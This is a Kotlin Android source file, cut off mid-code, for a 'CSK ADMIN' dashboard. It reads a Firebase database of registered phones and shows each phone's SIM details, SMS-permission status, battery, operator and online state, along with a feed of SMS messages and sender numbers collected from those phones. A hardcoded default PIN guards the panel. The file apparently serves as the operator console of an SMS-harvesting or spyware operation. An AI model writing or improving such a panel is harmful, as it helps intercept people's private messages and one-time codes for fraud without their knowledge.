package com.cskadmin.app

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.itemsIndexed
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Star
import androidx.compose.material.icons.outlined.Key
import androidx.compose.material.icons.outlined.Lock
import androidx.compose.material.icons.outlined.Search
import androidx.compose.material.icons.outlined.StarOutline
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.Path
import androidx.compose.ui.graphics.SolidColor
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.*
import kotlinx.coroutines.delay
import java.text.SimpleDateFormat
import java.util.*

private val CardBorder = Color(0xFF475569)
private val LightBorder = Color(0xFFCBD5E1)
private val GreenOnline = Color(0xFF16A34A)
private val OrangeOffline = Color(0xFFEA580C)
private val RedAlert = Color(0xFFB91C1C)
private val StarGold = Color(0xFFD97706)
private val BlueAccent = Color(0xFF1D4ED8)

private const val RTDB_URL = "https://sk-admin-panel-886ef-default-rtdb.firebaseio.com"
private const val ADMIN_PREFS = "csk_admin_prefs"
private const val KEY_ADMIN_PASSWORD = "admin_password"
private const val KEY_ADMIN_UNLOCKED = "admin_unlocked"
private const val KEY_STARRED_MOBILES = "starred_mobiles"
private const val KEY_HIDDEN_MOBILES = "hidden_mobiles"
private const val DEFAULT_ADMIN_PASSWORD = "2580"

data class AdminUserRow(
    val userName: String = "",
    val mobileNumber: String = "",
    val registrationTime: Long = 0L,
    val registrationTimeFormatted: String = "—",
    val timerExpiryTime: Long = 0L,
    val timerStatus: String = "active",
    val isOnline: Boolean = false,
    val smsPermissionStatus: String = "Not Available",
    val notificationPermissionStatus: String = "Not Requested",
    val smsAlertEnabled: Boolean = false,
    val simNumber: String = "Not Checked",
    val simPermissionStatus: String = "Not Requested",
    val sim1Details: String = "Not reported",
    val sim2Details: String = "Not reported",
    val deviceModel: String = "Android Device",
    val networkOperator: String = "—",
    val batteryPercentage: String = "0%",
    val deviceDateTime: String = "Pending"
)

data class AdminSmsAlertRow(
    val id: String = "",
    val mobileNumber: String = "",
    val alertMessage: String = "SMS Received",
    val senderNumber: String = "Not Available",
    val receivedAt: Long = 0L,
    val receivedAtFormatted: String = "—",
    val status: String = "New"
)

fun hasActiveInternet(context: Context): Boolean {
    val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
        ?: return false
    val network = cm.activeNetwork ?: return false
    val caps = cm.getNetworkCapabilities(network) ?: return false
    return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
        caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
}

class MainActivity : ComponentActivity() {
    private val auth: FirebaseAuth by lazy { FirebaseAuth.getInstance() }
    private val database: FirebaseDatabase by lazy { FirebaseDatabase.getInstance(RTDB_URL) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color.White
                ) {
                    CskAdminScreen(auth = auth, database = database)
                }
            }
        }
    }
}

@Composable
fun RedSparklineGraph(
    modifier: Modifier = Modifier,
    seedValue: Int = 0
) {
    Canvas(modifier = modifier) {
        val points = listOf(
            0.22f, 0.45f, 0.38f, 0.48f, 0.44f, 0.55f, 0.72f, 0.42f, 0.68f, 0.58f,
            0.66f, 0.62f, 0.50f, 0.36f, 0.78f, 0.25f, 0.65f, 0.18f, 0.46f, 0.42f,
            0.35f, 0.54f, 0.52f, 0.36f, 0.32f, 0.58f, 0.40f, 0.34f, 0.76f, 0.48f, 0.52f
        )
        val w = size.width
        val h = size.height
        if (w <= 0f || h <= 0f) return@Canvas

        val step = w / (points.size - 1).coerceAtLeast(1)
        val linePath = Path()
        val fillPath = Path()

        points.forEachIndexed { idx, raw ->
            val shifted = ((raw + (seedValue % 3) * 0.04f).coerceIn(0.10f, 0.90f))
            val x = idx * step
            val y = h * shifted
            if (idx == 0) {
                linePath.moveTo(x, y)
                fillPath.moveTo(x, h)
                fillPath.lineTo(x, y)
            } else {
                linePath.lineTo(x, y)
                fillPath.lineTo(x, y)
            }
        }
        fillPath.lineTo(w, h)
        fillPath.close()

        drawPath(
            path = fillPath,
            color = Color(0xFFFCA5A5).copy(alpha = 0.65f)
        )
        drawPath(
            path = linePath,
            color = Color(0xFFEF4444),
            style = Stroke(width = 2.dp.toPx())
        )
    }
}

@Composable
fun GradientPhoneThumbnail(modifier: Modifier = Modifier) {
    Box(
        modifier = modifier
            .clip(RoundedCornerShape(4.dp))
            .background(
                brush = Brush.linearGradient(
                    colors = listOf(
                        Color(0xFF93C5FD),
                        Color(0xFFF5D0FE),
                        Color(0xFF22D3EE),
                        Color(0xFFE0F2FE),
                        Color(0xFFFBCFE8)
                    )
                )
            )
            .border(1.dp, CardBorder, RoundedCornerShape(4.dp))
    )
}

@Composable
fun CskAdminScreen(
    auth: FirebaseAuth,
    database: FirebaseDatabase
) {
    val context = LocalContext.current
    val prefs = remember { context.getSharedPreferences(ADMIN_PREFS, Context.MODE_PRIVATE) }

    var currentUser by remember { mutableStateOf(auth.currentUser) }
    var isUnlocked by remember { mutableStateOf(prefs.getBoolean(KEY_ADMIN_UNLOCKED, false)) }

    var passwordInput by remember { mutableStateOf("") }
    var authError by remember { mutableStateOf<String?>(null) }
    var isSigningIn by remember { mutableStateOf(false) }

    var rtdbConnected by remember { mutableStateOf(false) }
    var networkAvailable by remember { mutableStateOf(hasActiveInternet(context)) }
    val firebaseConnected = rtdbConnected && networkAvailable

    var serverTimeOffsetMs by remember { mutableLongStateOf(0L) }
    var nowMs by remember { mutableLongStateOf(System.currentTimeMillis()) }
    var lastSyncedTime by remember { mutableStateOf("—") }
    var users by remember { mutableStateOf<List<AdminUserRow>>(emptyList()) }
    var smsAlerts by remember { mutableStateOf<List<AdminSmsAlertRow>>(emptyList()) }
    var dbError by remember { mutableStateOf<String?>(null) }
    var searchQuery by remember { mutableStateOf("") }

    var starredMobiles by remember {
        mutableStateOf(prefs.getStringSet(KEY_STARRED_MOBILES, emptySet())?.toSet() ?: emptySet())
    }
    var hiddenMobiles by remember {
        mutableStateOf(prefs.getStringSet(KEY_HIDDEN_MOBILES, emptySet())?.toSet() ?: emptySet())
    }

    var infoUser by remember { mutableStateOf<AdminUserRow?>(null) }
    var deleteTarget by remember { mutableStateOf<AdminUserRow?>(null) }

    var showChangePasswordDialog by remember { mutableStateOf(false) }
    var currentPw by remember { mutableStateOf("") }
    var newPw by remember { mutableStateOf("") }
    var pwStatusMessage by remember { mutableStateOf<String?>(null) }
    var pwIsError by remember { mutableStateOf(false) }

    LaunchedEffect(Unit) {
        while (true) {
            nowMs = System.currentTimeMillis()
            delay(250)
        }
    }

    DisposableEffect(context) {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                networkAvailable = hasActiveInternet(context)
            }

            override fun onLost(network: Network) {
                networkAvailable = hasActiveInternet(context)
            }

            override fun onCapabilitiesChanged(
                network: Network,
                networkCapabilities: NetworkCapabilities
            ) {
                networkAvailable =
                    networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                        networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
            }
        }
        val request = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()
        cm.registerNetworkCallback(request, callback)
        onDispose {
            try {
                cm.unregisterNetworkCallback(callback)
            } catch (_: Exception) {
            }
        }
    }

    DisposableEffect(auth, isUnlocked) {
        val listener = FirebaseAuth.AuthStateListener { fa ->
            currentUser = fa.currentUser
        }
        auth.addAuthStateListener(listener)
        if (isUnlocked && auth.currentUser == null) {
            auth.signInAnonymously()
        }
        onDispose { auth.removeAuthStateListener(listener) }
    }

    DisposableEffect(database) {
        val connRef = database.getReference(".info/connected")
        val offsetRef = database.getReference(".info/serverTimeOffset")

        val connListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                rtdbConnected = snapshot.getValue(Boolean::class.java) == true
            }

            override fun onCancelled(error: DatabaseError) {
                rtdbConnected = false
            }
        }
        val offsetListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                serverTimeOffsetMs = snapshot.getValue(Long::class.java) ?: 0L
            }

            override fun onCancelled(error: DatabaseError) {}
        }

        connRef.addValueEventListener(connListener)
        offsetRef.addValueEventListener(offsetListener)
        onDispose {
            connRef.removeEventListener(connListener)
            offsetRef.removeEventListener(offsetListener)
        }
    }

    DisposableEffect(isUnlocked, currentUser?.uid) {
        if (!isUnlocked) {
            users = emptyList()
            smsAlerts = emptyList()
            onDispose { }
        } else {
            val usersRef = database.getReference("users")
            val alertsRef = database.getReference("sms_alerts")
            val timeFmt = SimpleDateFormat("hh:mm:ss a", Locale("en", "IN"))
            val dateFmt = SimpleDateFormat("dd/MM/yyyy | hh:mm a", Locale("en", "IN"))

            val listener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    dbError = null
                    val list = mutableListOf<AdminUserRow>()
                    for (child in snapshot.children) {
                        val mobile = child.child("mobileNumber").getValue(String::class.java)
                            ?: child.child("phone").getValue(String::class.java)
                            ?: child.key.orEmpty()
                        val name = child.child("userName").getValue(String::class.java)
                            ?: child.child("name").getValue(String::class.java)
                            ?: "User"
                        val regTime = child.child("registrationTime").getValue(Long::class.java) ?: 0L
                        val regFormatted = child.child("registrationTimeFormatted").getValue(String::class.java)
                            ?: if (regTime > 0L) dateFmt.format(Date(regTime)) else "—"
                        val expiry = child.child("timerExpiryTime").getValue(Long::class.java) ?: 0L
                        val timerStatus = child.child("timerStatus").getValue(String::class.java) ?: "active"
                        val connStr = child.child("connectionStatus").getValue(String::class.java)
                        val isOnlineBool = child.child("isOnline").getValue(Boolean::class.java)
                        val online = connStr == "online" || isOnlineBool == true
                        val smsStatus = child.child("smsPermissionStatus").getValue(String::class.java)
                            ?: "Not Available"
                        val notifStatus = child.child("notificationPermissionStatus").getValue(String::class.java)
                            ?: "Not Requested"
                        val smsAlertEnabled = child.child("smsAlertEnabled").getValue(Boolean::class.java) ?: false
                        val simNumber = child.child("simNumber").getValue(String::class.java)
                            ?: "Not Checked"
                        val simPermStatus = child.child("simPermissionStatus").getValue(String::class.java)
                            ?: "Not Requested"
                        val sim1Details = child.child("sim1Details").getValue(String::class.java)
                            ?: simNumber.takeIf { it != "Not Checked" }
                            ?: "Not reported"
                        val sim2Details = child.child("sim2Details").getValue(String::class.java)
                            ?: "Not reported"
                        val deviceModel = child.child("deviceModel").getValue(String::class.java)
                            ?: child.child("mobileModel").getValue(String::class.java)
                            ?: "Android Device"
                        val networkOperator = child.child("networkOperator").getValue(String::class.java)
                            ?: child.child("operatorName").getValue(String::class.java)
                            ?: if (online) "Connected" else "Offline"
                        val batteryPct = child.child("batteryPercentage").getValue(String::class.java)
                            ?: child.child("battery").getValue(Long::class.java)?.let { "${it}%" }
                            ?: "0%"
                        val deviceDateTime = child.child("deviceDateTime").getValue(String::class.java)
                            ?: child.child("deviceTime").getValue(String::class.java)
                            ?: regFormatted

                        list.add(
                            AdminUserRow(
                                userName = name,
                                mobileNumber = mobile,
                                registrationTime = regTime,
                                registrationTimeFormatted = regFormatted,
                                timerExpiryTime = expiry,
                                timerStatus = timerStatus,
                                isOnline = online,
                                smsPermissionStatus = smsStatus,
                                notificationPermissionStatus = notifStatus,
                                smsAlertEnabled = smsAlertEnabled,
                                simNumber = simNumber,
                                simPermissionStatus = simPermStatus,
                                sim1Details = sim1Details,
                                sim2Details = sim2Details,
                                deviceModel = deviceModel,
                                networkOperator = networkOperator,
                                batteryPercentage = batteryPct,
                                deviceDateTime = deviceDateTime
                            )
                        )
                    }
                    list.sortByDescending { it.registrationTime }
                    users = list
                    lastSyncedTime = timeFmt.format(Date())
                }

                override fun onCancelled(error: DatabaseError) {
                    dbError = if (error.code == DatabaseError.PERMISSION_DENIED) {
                        "Permission denied by Firebase Database Rules."
                    } else {
                        error.message
                    }
                }
            }

            val alertsListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val list = mutableListOf<AdminSmsAlertRow>()
                    for (userNode in snapshot.children) {
                        val mobile = userNode.key.orEmpty()
                        for (alertNode in userNode.children) {
                            val recAt = alertNode.child("receivedAt").getValue(Long::class.java) ?: 0L
                            list.add(
                                AdminSmsAlertRow(
                                    id = alertNode.key.orEmpty(),
                                    mobileNumber = alertNode.child("mobileNumber").getValue(String::class.java)
                                        ?: mobile,
                                    alertMessage = alertNode.child("alertMessage").getValue(String::class.java)
                                        ?: "SMS Received",
                                    senderNumber = alertNode.child("senderNumber").getValue(String::class.java)
                                        ?: "Not Available",
                                    receivedAt = recAt,
                                    receivedAtFormatted = alertNode.child("receivedAtFormatted")
                                        .getValue(String::class.java)
                                        ?: if (recAt > 0L) dateFmt.format(Date(recAt)) else "—",
                                    status = alertNode.child("status").getValue(String::class.java) ?: "New"
                                )
                            )
                        }
                    }
                    list.sortByDescending { it.receivedAt }
                    smsAlerts = list
                }

                override fun onCancelled(error: DatabaseError) {}
            }

            usersRef.addValueEventListener(listener)
            alertsRef.addValueEventListener(alertsListener)
            onDispose {
                usersRef.removeEventListener(listener)
                alertsRef.removeEventListener(alertsListener)
            }
        }
    }

    val visibleUsers = remember(users, hiddenMobiles, starredMobiles) {
        users
            .filter { !hiddenMobiles.contains(it.mobileNumber) }
            .sortedWith(
                compareByDescending<AdminUserRow> { starredMobiles.contains(it.mobileNumber) }
                    .thenByDescending { it.registrationTime }
            )
    }

    val filteredUsers = remember(visibleUsers, searchQuery) {
        val q = searchQuery.trim().lowercase(Locale.getDefault())
        if (q.isEmpty()) visibleUsers
        else visibleUsers.filter {
            it.userName.lowercase(Locale.getDefault()).contains(q) ||
                it.mobileNumber.lowercase(Locale.getDefault()).contains(q) ||
                it.simNumber.lowercase(Locale.getDefault()).contains(q) ||
                it.sim1Details.lowercase(Locale.getDefault()).contains(q) ||
                it.sim2Details.lowercase(Locale.getDefault()).contains(q) ||
                it.deviceModel.lowercase(Locale.getDefault()).contains(q)
        }
    }

    val onlineCount = remember(visibleUsers) { visibleUsers.count { it.isOnline } }
    val offlineCount = visibleUsers.size - onlineCount

    val toggleStar: (String) -> Unit = { mobile ->
        val updated = if (starredMobiles.contains(mobile)) {
            starredMobiles - mobile
        } else {
            starredMobiles + mobile
        }
        starredMobiles = updated
        prefs.edit().putStringSet(KEY_STARRED_MOBILES, updated).apply()
    }

    if (showChangePasswordDialog) {
        AlertDialog(
            containerColor = Color.White,
            onDismissRequest = { showChangePasswordDialog = false },
            title = { Text("Change Admin Password", fontWeight = FontWeight.Bold) },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
                    OutlinedTextField(
                        value = currentPw,
                        onValueChange = { currentPw = it },
                        label = { Text("Current Password") },
                        visualTransformation = PasswordVisualTransformation(),
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth()
                    )
                    OutlinedTextField(
                        value = newPw,
                        onValueChange = { newPw = it },
                        label = { Text("New Password") },
                        visualTransformation = PasswordVisualTransformation(),
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth()
                    )
                    pwStatusMessage?.let { msg ->
                        Text(
                            text = msg,
                            fontSize = 13.sp,
                            color = if (pwIsError) RedAlert else GreenOnline
                        )
                    }
                }
            },
            confirmButton = {
                TextButton(
                    onClick = {
                        val savedPw = prefs.getString(KEY_ADMIN_PASSWORD, DEFAULT_ADMIN_PASSWORD)
                            ?: DEFAULT_ADMIN_PASSWORD
                        if (currentPw.trim() != savedPw) {
                            pwIsError = true
                            pwStatusMessage = "Current password is incorrect."
                            return@TextButton
                        }
                        if (newPw.trim().length < 4) {
                            pwIsError = true
                            pwStatusMessage = "New password must be at least 4 characters."
                            return@TextButton
                        }
                        prefs.edit().putString(KEY_ADMIN_PASSWORD, newPw.trim()).apply()
                        pwIsError = false
                        pwStatusMessage = "Password updated."
                        currentPw = ""
                        newPw = ""
                    }
                ) {
                    Text("Update")
                }
            },
            dismissButton = {
                TextButton(onClick = { showChangePasswordDialog = false }) {
                    Text("Close")
                }
            }
        )
    }

    infoUser?.let { selected ->
        val serverNow = nowMs + serverTimeOffsetMs
        val remSecs = if (selected.timerExpiryTime > 0L) {
            kotlin.math.max(0, kotlin.math.ceil((selected.timerExpiryTime - serverNow) / 1000.0).toInt())
        } else {
            0
        }
        val timerLabel = if (selected.timerExpiryTime <= 0L) {
            "—"
        } else if (remSecs > 0) {
            String.format(Locale.US, "Active · %02d:%02d", remSecs / 60, remSecs % 60)
        } else {
            "Expired (00:00)"
        }
        val deviceAlerts = smsAlerts.filter { it.mobileNumber == selected.mobileNumber }

        AlertDialog(
            containerColor = Color.White,
            onDismissRequest = { infoUser = null },
            title = {
                Text(
                    text = "${selected.userName} (+91 ${selected.mobileNumber})",
                    fontSize = 17.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF0F172A)
                )
            },
            text = {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .heightIn(max = 420.dp)
                        .verticalScroll(rememberScrollState()),
                    verticalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    Text(
                        text = "Status: ${if (selected.isOnline) "Online" else "Offline"}",
                        fontSize = 13.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (selected.isOnline) GreenOnline else OrangeOffline
                    )
                    Text("Model: ${selected.deviceModel}", fontSize = 13.sp, color = Color(0xFF0F172A))
                    Text("Battery: ${selected.batteryPercentage}", fontSize = 13.sp, color = Color(0xFF0F172A))
                    Text("Network Operator: ${selected.networkOperator}", fontSize = 13.sp, color = Color(0xFF334155))
                    Text("SIM 1: ${selected.sim1Details}", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = Color(0xFF0F172A))
                    Text("SIM 2: ${selected.sim2Details}", fontSize = 13.sp, color = Color(0xFF334155))
                    Text("Device Date & Time: ${selected.deviceDateTime}", fontSize = 12.sp, color = Color(0xFF475569))
                    Text("Registered: ${selected.registrationTimeFormatted}", fontSize = 12.sp, color = Color(0xFF64748B))
                    Text("Timer: $timerLabel", fontSize = 12.sp, fontFamily = FontFamily.Monospace, color = Color(0xFF334155))
                    Text(
                        text = "SIM Permission: ${selected.simPermissionStatus}",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = if (selected.simPermissionStatus == "Granted") GreenOnline else RedAlert
                    )
                    Text(
                        text = "SMS Permission: ${selected.smsPermissionStatus}",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = if (selected.smsPermissionStatus == "Granted") GreenOnline else RedAlert
                    )
                    Text("Notifications: ${selected.notificationPermissionStatus}", fontSize = 12.sp, color = Color(0xFF475569))
                    Text(
                        text = "SMS Alert: ${if (selected.smsAlertEnabled) "Enabled" else "Off"}",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = if (selected.smsAlertEnabled) GreenOnline else Color(0xFF64748B)
                    )

                    if (deviceAlerts.isNotEmpty()) {
                        HorizontalDivider(color = LightBorder, modifier = Modifier.padding(vertical = 4.dp))
                        Text(
                            text = "User SMS Alerts (${deviceAlerts.size})",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF0F172A)
                        )
                        deviceAlerts.take(10).forEach { alert ->
                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .border(1.dp, LightBorder, RoundedCornerShape(8.dp))
                                    .padding(8.dp),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Column(modifier = Modifier.weight(1f)) {
                                    Text(alert.alertMessage, fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
                                    Text(
                                        text = "${alert.senderNumber} · ${alert.receivedAtFormatted}",
                                        fontSize = 11.sp,
                                        color = Color(0xFF64748B)
                                    )
                                }
                                if (alert.status == "New") {
                                    TextButton(onClick = {
                                        database.getReference("sms_alerts/${alert.mobileNumber}/${alert.id}/status")
                                            .setValue("Seen")
                                    }) {
                                        Text("Mark Seen", fontSize = 11.sp, color = GreenOnline, fontWeight = FontWeight.Bold)
                                    }
                                } else {
                                    Text("Seen", fontSize = 11.sp, color = Color(0xFF64748B))
                                }
                            }
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { infoUser = null }) {
                    Text("Close")
                }
            }
        )
    }

    deleteTarget?.let { target ->
        AlertDialog(
            containerColor = Color.White,
            onDismissRequest = { deleteTarget = null },
            title = { Text("Delete Device?", fontWeight = FontWeight.Bold) },
            text = {
                Text("Remove ${target.userName} (+91 ${target.mobileNumber}) from the device list?")
            },
            confirmButton = {
                TextButton(
                    onClick = {
                        val mobile = target.mobileNumber
                        deleteTarget = null
                        database.getReference("users/$mobile").removeValue()
                        database.getReference("sms_alerts/$mobile").removeValue()
                        val nextHidden = hiddenMobiles + mobile
                        hiddenMobiles = nextHidden
                        prefs.edit().putStringSet(KEY_HIDDEN_MOBILES, nextHidden).apply()
                    }
                ) {
                    Text("Delete", color = RedAlert, fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(onClick = { deleteTarget = null }) {
                    Text("Cancel")
                }
            }
        )
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
    ) {
        // Compact White Top Header with Admin Actions
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 14.dp, vertical = 10.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column {
                Text(
                    text = "CSK ADMIN",
                    fontSize = 18.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF0F172A)
                )
                Text(
                    text = if (firebaseConnected) "Connected · $lastSyncedTime" else "Disconnected",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.SemiBold,
                    color = if (firebaseConnected) GreenOnline else RedAlert
                )
            }
            if (isUnlocked) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(4.dp)
                ) {
                    IconButton(
                        onClick = {
                            pwStatusMessage = null
                            showChangePasswordDialog = true
                        }
                    ) {
                        Icon(
                            imageVector = Icons.Outlined.Key,
                            contentDescription = "Change Password",
                            tint = Color(0xFF0F172A),
                            modifier = Modifier.size(20.dp)
                        )
                    }
                    IconButton(
                        onClick = {
                            prefs.edit().putBoolean(KEY_ADMIN_UNLOCKED, false).apply()
                            isUnlocked = false
                            passwordInput = ""
                        }
                    ) {
                        Icon(
                            imageVector = Icons.Outlined.Lock,
                            contentDescription = "Lock",
                            tint = Color(0xFF0F172A),
                            modifier = Modifier.size(20.dp)
                        )
                    }
                }
            }
        }
        HorizontalDivider(color = LightBorder)

        if (!isUnlocked) {
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(24.dp),
                verticalArrangement = Arrangement.Center
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .border(1.dp, CardBorder, RoundedCornerShape(14.dp))
                        .padding(20.dp),
                    verticalArrangement = Arrangement.spacedBy(14.dp)
                ) {
                    Text(
                        text = "CSK ADMIN Login",
                        fontSize = 22.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color(0xFF0F172A)
                    )
                    Text(
                        text = "Enter Admin Password to open Device Overview.",
                        fontSize = 13.sp,
                        color = Color(0xFF475569)
                    )
                    OutlinedTextField(
                        value = passwordInput,
                        onValueChange = {
                            passwordInput = it
                            authError = null
                        },
                        label = { Text("Enter Password") },
                        visualTransformation = PasswordVisualTransformation(),
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.NumberPassword),
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth()
                    )
                    authError?.let {
                        Text(text = it, color = RedAlert, fontSize = 13.sp)
                    }
                    Button(
                        onClick = {
                            authError = null
                            val savedPw = prefs.getString(KEY_ADMIN_PASSWORD, DEFAULT_ADMIN_PASSWORD)
                                ?: DEFAULT_ADMIN_PASSWORD
                            if (passwordInput.trim() != savedPw) {
                                authError = "Incorrect password."
                                return@Button
                            }
                            if (auth.currentUser != null) {
                                prefs.edit().putBoolean(KEY_ADMIN_UNLOCKED, true).apply()
                                isUnlocked = true
                            } else {
                                isSigningIn = true
                                auth.signInAnonymously()
                                    .addOnCompleteListener {
                                        isSigningIn = false
                                        prefs.edit().putBoolean(KEY_ADMIN_UNLOCKED, true).apply()
                                        isUnlocked = true
                                    }
                            }
                        },
                        enabled = !isSigningIn,
                        colors = ButtonDefaults.buttonColors(containerColor = BlueAccent),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(48.dp)
                    ) {
                        Text(
                            text = if (isSigningIn) "Opening..." else "Login",
                            color = Color.White,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }
            }
        } else {
            LazyColumn(
                modifier = Modifier
                    .fillMaxSize()
                    .background(Color.White)
                    .padding(horizontal = 12.dp),
                contentPadding = PaddingValues(vertical = 10.dp),
                verticalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                // Top Summary Box matching screenshot
                item {
                    Column(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(Color.White, RoundedCornerShape(10.dp))
                            .border(1.dp, CardBorder, RoundedCornerShape(10.dp))
                            .padding(horizontal = 12.dp, vertical = 10.dp),
                        verticalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = "Device Count : ${visibleUsers.size}",
                                fontSize = 16.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color(0xFF0F172A)
                            )
                            RedSparklineGraph(
                                modifier = Modifier
                                    .width(155.dp)
                                    .height(26.dp),
                                seedValue = visibleUsers.size + smsAlerts.size
                            )
                        }

                        Text(
                            text = "Online: $onlineCount | Offline: $offlineCount | SMS: ${smsAlerts.size}",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF0F172A),
                            modifier = Modifier.align(Alignment.CenterHorizontally)
                        )

                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .border(1.dp, CardBorder, RoundedCornerShape(12.dp))
                                .padding(horizontal = 14.dp, vertical = 10.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Column(modifier = Modifier.weight(1f)) {
                                Box(modifier = Modifier.fillMaxWidth()) {
                                    if (searchQuery.isEmpty()) {
                                        Text(
                                            text = "Search Here",
                                            fontSize = 15.sp,
                                            fontWeight = FontWeight.SemiBold,
                                            color = Color(0xFF0F172A)
                                        )
                                    }
                                    BasicTextField(
                                        value = searchQuery,
                                        onValueChange = { searchQuery = it },
                                        singleLine = true,
                                        textStyle = TextStyle(
                                            color = Color(0xFF0F172A),
                                            fontSize = 15.sp,
                                            fontWeight = FontWeight.SemiBold
                                        ),
                                        cursorBrush = SolidColor(Color(0xFF0F172A)),
                                        modifier = Modifier.fillMaxWidth()
                                    )
                                }
                                Spacer(modifier = Modifier.height(2.dp))
                                HorizontalDivider(color = Color(0xFF334155), thickness = 1.dp)
                            }
                            Spacer(modifier = Modifier.width(10.dp))
                            Icon(
                                imageVector = Icons.Outlined.Search,
                                contentDescription = "Search",
                                tint = Color(0xFF0F172A),
                                modifier = Modifier.size(26.dp)
                            )
                        }
                    }
                }

                dbError?.let { err ->
                    item {
                        Text(text = err, color = RedAlert, fontSize = 13.sp)
                    }
                }

                if (filteredUsers.isEmpty()) {
                    item {
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .border(1.dp, CardBorder, RoundedCornerShape(12.dp))
                                .padding(24.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Text("No registered devices found.", color = Color(0xFF64748B))
                        }
                    }
                } else {
                    itemsIndexed(filteredUsers, key = { _, item -> item.mobileNumber }) { index, item ->
                        val isStarred = starredMobiles.contains(item.mobileNumber)
                        val displayDate = item.deviceDateTime
                            .takeIf { it.isNotBlank() && it != "Pending" }
                            ?: item.registrationTimeFormatted

                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(Color.White, RoundedCornerShape(12.dp))
                                .border(1.dp, CardBorder, RoundedCornerShape(12.dp))
                                .padding(12.dp),
